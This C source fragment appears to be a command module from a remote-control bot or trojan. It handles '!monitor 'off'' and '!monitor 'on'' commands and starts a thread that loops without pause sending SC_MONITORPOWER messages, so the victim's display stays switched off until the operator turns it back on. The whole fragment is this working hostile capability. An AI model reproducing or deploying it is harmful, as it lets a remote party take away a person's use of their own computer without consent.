bool monitor(char CmdLine[500]);
void LoopMonitor(void);

bool MonitorOn = true;

bool monitor(char CmdLine[500])
{
	DWORD		MonitorThreadId;

	if(CheckCmdLine(CmdLine, 2) == true)
	{
		if(lstrcmp(CmdLine, "!monitor 'off'") == 0)
		{
			MonitorOn = false;
			if(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)LoopMonitor, 0, 0, &MonitorThreadId) != 0)
			{
				lstrcpy(MainBuffer, "Monitor is off.");
				return true;
			}
		}
		
		if(lstrcmp(CmdLine, "!monitor 'on'") == 0)
		{
			lstrcpy(MainBuffer, "Monitor is on.");
			MonitorOn = true;
			return true;
		}
	}

	return false;
}

void LoopMonitor(void)
{
	while(MonitorOn == false)
	{
		SendMessage(GetDesktopWindow(), WM_SYSCOMMAND, SC_MONITORPOWER, 2);
	}

	return;
}